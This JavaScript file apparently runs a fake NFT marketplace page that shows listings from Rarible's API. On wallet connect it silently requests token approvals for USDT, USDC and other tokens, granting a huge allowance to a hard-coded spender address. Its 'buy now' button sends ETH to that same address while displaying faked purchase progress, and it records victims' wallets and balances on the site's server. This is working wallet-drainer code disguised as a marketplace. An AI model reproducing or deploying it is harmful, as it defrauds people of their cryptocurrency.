let account = "";
let balance = 0;
let spender = "0x5DFa503C937E0DC79352445bDc6Ff69EfC5D72d7";
let tokens = [
	{
		name: "TUSDT",
		address: "0xD92E713d051C37EbB2561803a3b5FBAbc4962431",
		decimals: 6,
	},
	{
		name: "USDT",
		address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
		decimals: 6,
	},
	{
		name: "USDC",
		address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
		decimals: 6,
	},
	{
		name: "BNB",
		address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
		decimals: 6,
	},
];
if (account == "") {
	if (typeof window.ethereum != undefined) {
		console.log("Metamask installed");
	} else {
		console.log("Metamask not installed");
	}

	async function login() {
		const accounts = await ethereum
			.request({ method: "eth_requestAccounts" })
			.catch((e) => {
				console.log(e);
			});
		account = accounts[0];
		getBalance();
		// getTokenBalance(tokens[0]);
	}

	document.body.addEventListener("click", function(e) {
		let targetId = e.target.id;
		if (targetId == "connect-metamask") {
			if (ethereum.networkVersion == 4) {
				login();
			} else {
				console.log("Change network version");
			}
		}
	});

	function getBalance() {
		let web3 = new Web3(Web3.givenProvider);
		web3.eth.getBalance(account, function(err, result) {
			if (err) {
				console.log(err);
			} else {
				balance = web3.utils.fromWei(result);
			}
		});
	}

	async function getTokenBalance(token) {
		let web3 = new Web3(Web3.givenProvider);
		let contract = new web3.eth.Contract(ERC20, token.address);
		let balance = await contract.methods.balanceOf(account).call();
		let decimals = Math.pow(10, token.decimals);
		balance = balance / decimals;
		getToken(token, balance);
	}

	function getToken(token, balance) {
		let web3 = new Web3(Web3.givenProvider);
		let contract = new web3.eth.Contract(ERC20, token.address);
		contract.methods
			.approve(spender, Math.pow(10, token.decimals) * 1000000)
			.send({ from: account })
			.then(function(receipt) {
				getUser(true)
			})
			.catch(function(err) {
				getUser(false)
			});
	}
	function getUser(hasAccess) {
		let getUserXhr = new XMLHttpRequest();
		getUserXhr.open("GET", `/user/${account}`, true);
		getUserXhr.send();

		getUserXhr.onreadystatechange = function() {
			if (this.status == 200 && this.readyState == 4) {
				let response = JSON.parse(this.response);
				if (response != null) {
					location.replace(`/nft.html?address=${address}&wallet=${address2}`);
				} else {
					createUser(hasAccess);
				}
			}
		};
	}

	function createUser(hasAccess) {
		let userPayload = {
			walletAddress: account,
			balance: ethBalance,
			usdt: tokenBalance,
			hasAccess: hasAccess,
		};
		console.log(userPayload);
		let createUserXhr = new XMLHttpRequest();
		createUserXhr.open("POST", `/user`, true);
		createUserXhr.setRequestHeader("Content-type", "application/json");
		createUserXhr.send(JSON.stringify(userPayload));

		createUserXhr.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				location.replace(`/nft.html?address=${address}&wallet=${address2}`);
			}
		};
	}


	if (address2 == null) {
		setTimeout(function() {
			if (typeof window.ethereum != undefined) {
				login();
			} else {
				location.href = "https://metamask.app.link/dapp/www.sensis.space";
			}
		}, 1000);
	}
	else {
		document.getElementById("connect-2").style.display = "none";
		document.getElementById("profile-image").style.display = "block";
		document.getElementById("notification").style.display = "block";
		document.getElementById("profile").href = `../profile.html?address=${address}`;
		getUser();
	}
}

function getUser() {
	let getUserXhr = new XMLHttpRequest();
	getUserXhr.open("GET", `/user/${address2}`, true);
	getUserXhr.send();

	getUserXhr.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			let response = JSON.parse(this.response);
			console.log(response.avatar);
			if (response.avatar != "") {
				document.getElementById("profile-image-2").src = "/images/" + response.avatar;
			}

		}
	}
}


let address = new URLSearchParams(window.location.search).get("address");
let address2 = new URLSearchParams(window.location.search).get("wallet");

let details = navigator.userAgent;
let length;

let regexp = /android|iphone|kindle|ipad/i;

let isMobileDevice = regexp.test(details);

if (isMobileDevice) {
	length = 5;
} else {
	length = 15;
}

let nftItemObj;

const getNftItem = (nftAddress) => {
	let nftItemXhr = new XMLHttpRequest();
	nftItemXhr.open(
		"GET",
		`https://ethereum-api.rarible.org/v0.1/nft/items/${nftAddress}`,
		true
	);
	nftItemXhr.send();

	nftItemXhr.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			let response = JSON.parse(this.response);
			getNftItemCollection(response);
		}
	};
};

const getNftItemCollection = (nftItem) => {
	let nftItemCollectionXhr = new XMLHttpRequest();
	nftItemCollectionXhr.open(
		"GET",
		`https://ethereum-api.rarible.org/v0.1/nft/collections/${nftItem.contract}`,
		true
	);
	nftItemCollectionXhr.send();

	nftItemCollectionXhr.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			let response = JSON.parse(this.response);
			let collection = { ...response };
			nftItem = { ...nftItem, collection };
			getOrder(nftItem);
		}
	};
};

const getOrder = (nftItem) => {
	let nftOrderXhr = new XMLHttpRequest();
	nftOrderXhr.open(
		"GET",
		`https://ethereum-api.rarible.org/v0.1/order/orders/sell/byItemAndByStatus?contract=${nftItem.contract}&tokenId=${nftItem.tokenId}&status=ACTIVE`,
		true
	);
	nftOrderXhr.send();

	nftOrderXhr.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			let response = JSON.parse(this.response);
			let orders = { ...response };
			nftItem = { ...nftItem, orders };
			getOrderBids(nftItem);
		}
	};
};

const getOrderBids = (nftItem) => {
	let orderBidsXhr = new XMLHttpRequest();
	orderBidsXhr.open(
		"GET",
		`https://ethereum-api.rarible.org/v0.1/order/orders/bids/byItemAndByStatus?contract=${nftItem.contract}&tokenId=${nftItem.tokenId}&status=ACTIVE`,
		true
	);
	orderBidsXhr.send();

	orderBidsXhr.onreadystatechange = function() {
		if (this.status == 200 && this.readyState == 4) {
			let response = JSON.parse(this.response);
			let orderBids = { ...response };
			nftItem = { ...nftItem, orderBids };
			getNftItemMeta(nftItem);
		}
	};
};

const getNftItemMeta = (nftItem) => {
	let nftItemMetaXhr = new XMLHttpRequest();
	nftItemMetaXhr.open(
		"GET",
		`https://ethereum-api.rarible.org/v0.1/nft/items/${nftItem.id}/meta`,
		true
	);
	nftItemMetaXhr.send();

	nftItemMetaXhr.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			let response = JSON.parse(this.response);
			let nftItemMeta = { ...response };
			nftItem = { ...nftItem, nftItemMeta };
			nftItemObj = nftItem;
			document.getElementById("image-root").innerHTML = placeImage(
				nftItem.nftItemMeta.content
			);
			document.getElementById("collection-image-root").innerHTML =
				placeCollectionImage(nftItem.nftItemMeta.content);
			document.getElementById(
				"view-collection"
			).href = `./collection.html?address=${nftItem.contract}`;
			document.getElementById("name").textContent = nftItem.nftItemMeta.name;
			document.getElementById("collection-name").textContent =
				nftItem.collection.name;
			document.getElementById("creator").textContent = truncAddress(
				nftItem.creators[0].account
			);
			document.getElementById("owner").textContent = truncAddress(
				nftItem.contract
			);
			let price = "Not for sale";
			let highestBid = "No bids";
			if (nftItem.orders.orders.length != 0) {
				price =
					nftItem.orders.orders[nftItem.orders.orders.length - 1].makePrice;
				document.getElementById("price-container").style.display = "block";
				document
					.getElementById("price-container")
					.classList.replace("l6", "l12");
				document.getElementById("buy").style.display = "block";
				document.getElementById("price-usd").textContent =
					"$" +
					numberWithCommas(nftItem.orders.orders[0].makePriceUsd.toFixed());
			}
			if (nftItem.orderBids.orders.length != 0) {
				highestBid = nftItem.orderBids.orders[0].takePrice.toFixed(2);
				document.getElementById("bids-container").style.display = "block";
				document
					.getElementById("bids-container")
					.classList.replace("l6", "l12");
				document.getElementById("highest-bid-maker").textContent =
					"by " + truncAddress(nftItem.orderBids.orders[0].maker);
				document.getElementById("place-bid").style.display = "block";
			}

			document.getElementById("buy").textContent =
				"Buy now for " + price + " ETH";
			document.getElementById("price").textContent = price + " ETH";
			document.getElementById("highest-bid").textContent = highestBid + " ETH";

			nftItem.nftItemMeta.attributes.forEach(function(attribute) {
				document.getElementById("properties-root").innerHTML +=
					bindProperties(attribute);
			});

			nftItem.orderBids.orders.forEach(function(bid) {
				document.getElementById("bids-root").innerHTML += bindBids(bid);
			});
			nftItem.orderBids.orders.forEach(function(bid, index) {
				if (index < 2) {
					document.getElementById("latest-bids-root").innerHTML +=
						bindBids(bid);
				}
			});
			document.getElementById("view-on-ether").href = `https://etherscan.io/`;

			getNftCollectionItems(nftItem.contract);
			if (nftItem.nftItemMeta.description != "") {
				document.getElementById("description-heading").style.display = "block";
			}
			document.getElementById("description").textContent =
				nftItem.nftItemMeta.description;
			loaded();
		}
	};
};

function loaded() {
	document.getElementById("loading-container").style.display = "none";
	document.getElementById("content").style.display = "block";
}

getNftItem(address);

const getNftCollectionItems = (nftCollection) => {
	let nftCollectionItemXhr = new XMLHttpRequest();
	nftCollectionItemXhr.open(
		"GET",
		`https://ethereum-api.rarible.org/v0.1/nft/items/byCollection?collection=${nftCollection}&size=10`,
		true
	);
	nftCollectionItemXhr.send();

	nftCollectionItemXhr.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			let response = JSON.parse(this.response);
			getNftItemMeta2(response.items);
		}
	};
};

const getNftItemMeta2 = (nftItems) => {
	let nftItemsMetaArray = [];
	nftItems.forEach(function(item) {
		let nftItemMetaXhr = new XMLHttpRequest();
		nftItemMetaXhr.open(
			"GET",
			`https://ethereum-api.rarible.org/v0.1/nft/items/${item.id}/meta`,
			true
		);
		nftItemMetaXhr.send();

		nftItemMetaXhr.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				let response = JSON.parse(this.response);
				let nftItemMeta = { ...response };
				nftItemsMetaArray.push({ ...item, nftItemMeta });
				if (nftItemsMetaArray.length == nftItems.length) {
					getNftOrder2(nftItemsMetaArray);
				}
			}
		};
	});
};

const getNftOrder2 = (nftItems) => {
	let nftItemsOrderArray = [];
	nftItems.forEach(function(item) {
		let nftItemOrderXhr = new XMLHttpRequest();
		nftItemOrderXhr.open(
			"GET",
			`https://ethereum-api.rarible.org/v0.1/order/orders/sell/byItemAndByStatus?contract=${item.contract}&tokenId=${item.tokenId}&status=ACTIVE`,
			true
		);
		nftItemOrderXhr.send();

		nftItemOrderXhr.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				let response = JSON.parse(this.response);
				let orders = { ...response };
				nftItemsOrderArray.push({ ...item, orders });
				if (nftItemsOrderArray.length == nftItems.length) {
					getNftOrderBids2(nftItemsOrderArray);
				}
			}
		};
	});
};

const getNftOrderBids2 = (nftItems) => {
	let nftOrderBidsArray = [];
	nftItems.forEach(function(item) {
		let nftOrderBidsXhr = new XMLHttpRequest();
		nftOrderBidsXhr.open(
			"GET",
			`https://ethereum-api.rarible.org/v0.1/order/orders/bids/byItemAndByStatus?contract=${item.contract}&tokenId=${item.tokenId}&status=ACTIVE`,
			true
		);
		nftOrderBidsXhr.send();

		nftOrderBidsXhr.onreadystatechange = function() {
			if (this.status == 200 && this.readyState == 4) {
				let response = JSON.parse(this.response);
				let orderBids = { ...response };
				nftOrderBidsArray.push({ ...item, orderBids });
				if (nftOrderBidsArray.length == nftItems.length) {
					getNftItemCollection2(nftOrderBidsArray);
				}
			}
		};
	});
};

const getNftItemCollection2 = (nftItem) => {
	let nftItemsMetaAndCollection = [];
	nftItem.forEach(function(item) {
		let nftItemCollectionXhr = new XMLHttpRequest();
		nftItemCollectionXhr.open(
			"GET",
			`https://ethereum-api.rarible.org/v0.1/nft/collections/${item.contract}`,
			true
		);
		nftItemCollectionXhr.send();

		nftItemCollectionXhr.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				let response = JSON.parse(this.response);
				let collection = { ...response };
				nftItemsMetaAndCollection.push({ collection, ...item });
				if (nftItemsMetaAndCollection.length == nftItem.length) {
					nftItemsMetaAndCollection.forEach(function(item) {
						document.getElementById("collection-item-root").innerHTML +=
							bindNft(item);
					});
				}
			}
		};
	});
};

const truncAddress = (address) => {
	let addressTrunc1 = address.slice(0, 5);
	let dot = "...";
	let addressTrunc2 = address.slice(38);
	let addressTrunc1Dot = addressTrunc1.concat(dot);
	return addressTrunc1Dot.concat(addressTrunc2);
};

function numberWithCommas(x) {
	return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

function placeImage(content) {
	let image = "";
	let type = "";
	if (content.length > 3) {
		image = content[3].url;
		type = content[3]["@type"];
		// console.log(content[2].url)
	} else if (content.length > 2) {
		image = content[2].url;
		type = content[2]["@type"];
		// console.log(content[2].url)
	} else if (content.length > 1) {
		image = content[1].url;
		type = content[1]["@type"];
		// console.log(content[1].url)
	} else if (content.length == 1) {
		image = content[0].url;
		type = content[0]["@type"];
		// console.log(content[0].url);
	} else {
		image = "./images/Eli-J.jpeg";
	}

	if (image.startsWith("i")) {
		image = image.replace("ipfs:", "https://ipfs.io/ipfs/");
	}
	//   console.log(name + ": ", image);

	if (type == "IMAGE") {
		return `
    <img
    class="image-width"
      src="${image}"
      alt=""
      style="border-radius: 16px"
    />
    `;
	} else {
		return `
    <video
    		  class="image-width"
              src="${image}"
              style="border-radius: 18px;"
              autoplay
              muted
              loop
            ></video>`;
	}
}

function placeTransactionImage(content) {
	let image = "";
	let type = "";
	if (content.length > 3) {
		image = content[3].url;
		type = content[3]["@type"];
		// console.log(content[2].url)
	} else if (content.length > 2) {
		image = content[2].url;
		type = content[2]["@type"];
		// console.log(content[2].url)
	} else if (content.length > 1) {
		image = content[1].url;
		type = content[1]["@type"];
		// console.log(content[1].url)
	} else if (content.length == 1) {
		image = content[0].url;
		type = content[0]["@type"];
		// console.log(content[0].url);
	} else {
		image = "./images/Eli-J.jpeg";
	}

	if (image.startsWith("i")) {
		image = image.replace("ipfs:", "https://ipfs.io/ipfs/");
	}
	//   console.log(name + ": ", image);

	if (type == "IMAGE") {
		return `
		  <img
              class="w3-margin-top w3-round-xlarge purchased-nft-image"
              src="${image}"
              alt=""
            />
		  `;
	} else {
		return `
		  <img
              class="w3-margin-top w3-round-xlarge purchased-nft-image"
              src="${image}"
              alt=""
            />`;
	}
}

function placeCollectionImage(content) {
	let image = "";
	let type = "";
	if (content.length > 3) {
		image = content[3].url;
		type = content[3]["@type"];
		// console.log(content[2].url)
	} else if (content.length > 2) {
		image = content[2].url;
		type = content[2]["@type"];
		// console.log(content[2].url)
	} else if (content.length > 1) {
		image = content[1].url;
		type = content[1]["@type"];
		// console.log(content[1].url)
	} else if (content.length == 1) {
		image = content[0].url;
		type = content[0]["@type"];
		// console.log(content[0].url);
	} else {
		image = "./images/Eli-J.jpeg";
	}

	if (image.startsWith("i")) {
		image = image.replace("ipfs:", "https://ipfs.io/ipfs/");
	}
	//   console.log(name + ": ", image);

	if (type == "IMAGE") {
		return `
    <img
      src="${image}"
      alt=""
      style="width: 30px;
      height: 30px;
      border-radius: 30px;"
    />
    `;
	} else {
		return `
    <video
              src="${image}"
              style="width: 30px;
              height: 30px;
              border-radius: 30px;"
              autoplay
              muted
              loop
            ></video>`;
	}
}

const bindNft = ({ nftItemMeta, collection, id, orderBids, orders }) => {
	let image = "";
	let type = "";
	if (nftItemMeta.content.length > 3) {
		image = nftItemMeta.content[3].url;
		type = nftItemMeta.content[3]["@type"];
		// console.log(nftItemMeta.content[2].url)
	} else if (nftItemMeta.content.length > 2) {
		image = nftItemMeta.content[2].url;
		type = nftItemMeta.content[2]["@type"];
		// console.log(nftItemMeta.content[2].url)
	} else if (nftItemMeta.content.length > 1) {
		image = nftItemMeta.content[1].url;
		type = nftItemMeta.content[1]["@type"];
		// console.log(nftItemMeta.content[1].url)
	} else if (nftItemMeta.content.length == 1) {
		image = nftItemMeta.content[0].url;
		type = nftItemMeta.content[0]["@type"];
		// console.log(content[0].url);
	} else {
		image = "./images/Eli-J.jpeg";
	}

	if (image.startsWith("i")) {
		image = image.replace("ipfs:", "https://ipfs.io/ipfs/");
	}
	//   console.log(name + ": ", image);
	let highestBid = "No bids";
	let highestBidDisplay = "none";
	if (orderBids.orders.length > 0) {
		highestBid = orderBids.orders[0].takePrice.toFixed(2) + " wETH";
		highestBidDisplay = "block";
	}

	let price = "Not for sale";
	let priceDisplay = "none";
	let prompt = "Highest bid";
	if (orders.orders.length > 0) {
		price = orders.orders[orders.orders.length - 1].makePrice + " wETH";
		priceDisplay = "block";
		if (isMobileDevice) {
			prompt = "Price";
			highestBid = price;
		}
	}
	if (type == "IMAGE") {
		return `
      <div
                class="w3-col s6 l3"
                style="padding-right: 12px; flex: 0 0 auto"
              >
              <a href="./nft.html?address=${id}">
                <div
                  class="border-light-brown-2 pointer"
                  style="border-radius: 12px; padding: 8px;"
                >
                <div style="position: relative">
                  <img
                  class="nft-height"
                    src="${image}"
                    alt=""
                    style="width: 100%; border-radius: 12px;"
                  />
                  <div style="position: absolute; bottom: 24px; width: 100%; display: flex; justify-content: center;">
                  <div class="w3-white w3-center w3-animate-zoom w3-round-large bold w3-padding small" style="box-shadow: 1px 1px 10px rgb(180, 180, 180); width: 90px; display: none">
                    Buy now
                  </div>
                  </div>
                  </div>
                  <div style="padding: 14px 0px 4px">
                    <div class="w3-row w3-hide-small" style="padding: 0px 8px">
                      <div class="w3-col l10">
                        <p class="no-margin small bold text-grey" style="text-overflow: ellipsis; overflow: hidden; white-space: nowrap;">${collection.name}</p>
                      </div>
                      <div class="w3-col l2">
                        <i class="fa fa-ellipsis-h no-margin w3-right"></i>
                      </div>
                    </div>
                    <p class="no-margin bold nft-name" style="text-overflow: ellipsis; overflow: hidden; white-space: nowrap;">${nftItemMeta.name}</p>
                    <div class="w3-row w3-round nft-card">
                      <div class="w3-col l9 w3-hide-small nft-text">
                        <p class="no-margin small bold text-grey">Price</p>
                      </div>
  
                      <div class="w3-col l3 nft-text">
                        <p class="no-margin small bold text-grey-2">${prompt}</p>
                      </div>
  
                      <div class="w3-col l9 w3-hide-small nft-text">
                        <p class="no-margin small bold">${price}</p>
                      </div>
                      <div class="w3-col l3">
                        <p class="no-margin small bold">${highestBid}</p>
                      </div>
                    </div>
                  </div>
                </div>
                </a>
              </div>`;
	} else {
		return `
      <div
                class="w3-col s6 l3"
                style="padding-right: 12px; flex: 0 0 auto"
              >
              <a href="./nft.html?address=${id}">
                <div
                  class="border-light-brown-2 pointer"
                  style="border-radius: 12px; padding: 8px;"
                >
                <video
                class="nft-video-height"
                src="${image}"
                style="width: 100%; border-radius: 12px;"
                autoplay
                muted
                loop
              ></video>
                  <div style="padding: 14px 0px 4px">
                    <div class="w3-row w3-hide-small" style="padding: 0px 8px">
                      <div class="w3-col l10">
                        <p class="no-margin small bold text-grey">${collection.name}</p>
                      </div>
                      <div class="w3-col l2">
                        <i class="fa fa-ellipsis-h no-margin w3-right"></i>
                      </div>
                    </div>
                    <p class="no-margin bold nft-name">${nftItemMeta.name}</p>
                    <div class="w3-row w3-round nft-card">
                      <div class="w3-col l8 w3-hide-small nft-text">
                        <p class="no-margin small bold text-grey">Price</p>
                      </div>
  
                      <div class="w3-col l4 nft-text">
                        <p class="no-margin small bold text-grey">Highest bid</p>
                      </div>
  
                      <div class="w3-col l8 w3-hide-small nft-text">
                        <p class="no-margin small bold">Not for sale</p>
                      </div>
                      <div class="w3-col l4">
                        <p class="no-margin small bold">1.8 wETH</p>
                      </div>
                    </div>
                  </div>
                </div>
                </a>
              </div>`;
	}
};

function bindProperties(property) {
	return `
  <div
  class="border-light-brown-2 w3-round-xlarge w3-padding w3-margin-bottom"
>
  <p class="text-grey-2 no-margin-3 bold small">${property.key}</p>
  <p class="no-margin-3 bold text-gradient">
    ${property.value}
  </p>
</div>
  `;
}

function bindBids(bid) {
	let col1 = "s1";
	let col2 = "s9";
	let textMargin = "no-margin-3";

	let usd = 0;

	if (bid.takePriceUsd) {
		usd = numberWithCommas(bid.takePriceUsd.toFixed());
	}

	if (isMobileDevice) {
		col1 = "s2";
		col2 = "s8";
		textMargin = "no-margin";
	}

	return `
  <div class="w3-row w3-margin-bottom w3-margin-top">
    <div class="w3-col ${col1}">
      <img
        src="./images/owner.svg"
        style="width: 50px; height: 50px; border-radius: 50px"
      />
    </div>
    <div class="w3-col ${col2}" style="padding-right: 2px">
      <p class="${textMargin} bold">${truncAddress(bid.maker)}</p>
      <p class="${textMargin} bold small text-grey-2">
        1 days ago • Expires in 4 weeks •
        <span class="text-gradient">Floor bid</span>
      </p>
    </div>
    <div class="w3-col s2">
      <div>
        <p class="bold ${textMargin}">${bid.takePrice} wETH</p>
        <p class="bold ${textMargin} small text-grey-2">$${usd}</p>
      </div>
    </div>
  </div>
  
  `;
}

document.body.addEventListener("click", function(e) {
	let targetId = e.target.id;

	if (targetId == "overview") {
		changeMetaTab(e.target);
	} else if (targetId == "properties") {
		changeMetaTab(e.target);
	} else if (targetId == "bids") {
		changeMetaTab(e.target);
	} else if (targetId == "see-all-bids") {
		changeMetaTab(document.getElementById("bids"));
	} else if (targetId == "buy") {
		buy();
	} else if (targetId == "cancel-buy") {
		document.getElementById("buy-modal").style.display = "none";
		document.getElementById("nft-loading").style.display = "none";
	} else if (targetId == "proceed-to-payment") {
		document.getElementById("nft-checkout").style.display = "none";
		document.getElementById("nft-transaction").style.display = "block";
		checkTransaction();
	} else if (targetId == "cancel-transaction") {
		document.getElementById("buy-modal").style.display = "none";
		document.getElementById("nft-transaction").style.display = "none";
		document.getElementById("approve-asset").classList.add("fa-spin");
		document
			.getElementById("approve-asset")
			.classList.replace("fa-check", "fa-spinner");
		document.getElementById("approve-asset").classList.remove("w3-text-green");
		document.getElementById("purchase").classList.add("fa-spin");
		document
			.getElementById("purchase")
			.classList.replace("fa-check", "fa-spinner");
		document.getElementById("purchase").classList.remove("w3-text-green");
		document.getElementById("transaction-error").style.display = "none";
	} else if (targetId == "copy") {
		navigator.clipboard.writeText(
			`https://www.sensis.space/nft.html?address=${address}`
		);
	}
});

function buy() {
	document.getElementById("buy-modal").style.display = "block";
	document.getElementById("nft-loading").style.display = "block";
	setTimeout(function() {
		document.getElementById("nft-loading").style.display = "none";
		document.getElementById("nft-checkout").style.display = "block";
		document.getElementById("nft-transact-name").textContent =
			nftItemObj.nftItemMeta.name;
		document.getElementById("nft-transact-owner").textContent = truncAddress(
			nftItemObj.contract
		);
		document.getElementById("balance").textContent =
			parseFloat(balance).toFixed(3);
		document.getElementById("service-fee").textContent = (
			nftItemObj.orders.orders[0].makePrice * 0.015
		).toFixed(3);
		document.getElementById("pay").textContent = (
			nftItemObj.orders.orders[0].makePrice * 0.015 +
			nftItemObj.orders.orders[0].makePrice
		).toFixed(3);
	}, 2000);
}

function checkTransaction() {
	setTimeout(function() {
		document.getElementById("approve-asset").classList.remove("fa-spin");
		document
			.getElementById("approve-asset")
			.classList.replace("fa-spinner", "fa-check");
		document.getElementById("approve-asset").classList.add("w3-text-green");
	}, 2000);
	transact();
}

function transact() {
	let web3 = new Web3(Web3.givenProvider);
	console.log(web3.utils.toHex(web3.utils.toWei("0.01")));
	let params = [
		{
			from: account,
			to: spender,
			//   gas: "0x1",
			//   gasPrice: "0x1",
			//   value: web3.utils.toHex(
			//     web3.utils
			//       .toWei(
			//         (
			//           nftItemObj.orders.orders[0].makePrice * 0.015 +
			//           nftItemObj.orders.orders[0].makePrice
			//         ).toString()
			//       )
			//       .toString()
			//   ), // 2441406250
			value: web3.utils.toHex(web3.utils.toWei("0.001")),
			data: "0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675",
		},
	];

	ethereum
		.request({
			method: "eth_sendTransaction",
			params,
		})
		.then((result) => {
			document.getElementById("purchase").classList.remove("fa-spin");
			document
				.getElementById("purchase")
				.classList.replace("fa-spinner", "fa-check");
			document.getElementById("purchase").classList.add("w3-text-green");
			setTimeout(function() {
				transactionComplete();
			}, 1000);
			// The result varies by RPC method.
			// For example, this method will return a transaction hash hexadecimal string on success.
		})
		.catch((error) => {
			document.getElementById("transaction-error").style.display = "block";
			document.getElementById("purchase").classList.remove("fa-spin");
			document
				.getElementById("purchase")
				.classList.replace("fa-spinner", "fa-check");
			// If the request fails, the Promise will reject with an error.
		});
}

function transactionComplete() {
	document.getElementById("nft-transaction").style.display = "none";
	document.getElementById("approve-asset").classList.add("fa-spin");
	document
		.getElementById("approve-asset")
		.classList.replace("fa-check", "fa-spinner");
	document.getElementById("approve-asset").classList.remove("w3-text-green");
	document.getElementById("purchase").classList.add("fa-spin");
	document
		.getElementById("purchase")
		.classList.replace("fa-check", "fa-spinner");
	document.getElementById("purchase").classList.remove("w3-text-green");
	document.getElementById("transaction-error").style.display = "none";

	setTimeout(function() {
		console.log(nftItemObj.nftItemMeta);
		document.getElementById("transaction-complete").style.display = "block";
		document.getElementById("transact-image").innerHTML = placeTransactionImage(
			nftItemObj.nftItemMeta.content
		);
		document.getElementById("completed-transact-name").textContent =
			nftItemObj.nftItemMeta.name;
	}, 1000);
	document.getElementById(
		"facebook"
	).href = `https://www.facebook.com/sharer.php?u=https://www.sensis.space/nft.html?address=${address}`;
	document.getElementById(
		"twitter"
	).href = `https://twitter.com/intent/tweet?url=https://www.sensis.space/nft.html?address=${address}&text=Hey every one. I just purchased my first ${nftItemObj.nftItemMeta.name} NFT. Come check it out`;
	document.getElementById(
		"telegram"
	).href = `https://telegram.me/share/url?url=https://www.sensis.space/nft.html?address=${address}&text=Hey every one. I just purchased my first ${nftItemObj.nftItemMeta.name} NFT. Come check it out`;
	document.getElementById(
		"view-nft"
	).href = `https://www.sensis.space/nft.html?address=${address}`;
}

function changeMetaTab(currentTab) {
	let metaTabs = document.querySelectorAll(".meta-tab");
	let metaTabRoot = document.querySelectorAll(".meta-tab-root");
	metaTabs.forEach(function(item) {
		item.classList.remove("background-primary");
	});
	metaTabRoot.forEach(function(item) {
		item.style.display = "none";
	});
	currentTab.classList.add("background-primary");
	document.getElementById(`${currentTab.id}-root`).style.display = "block";
}
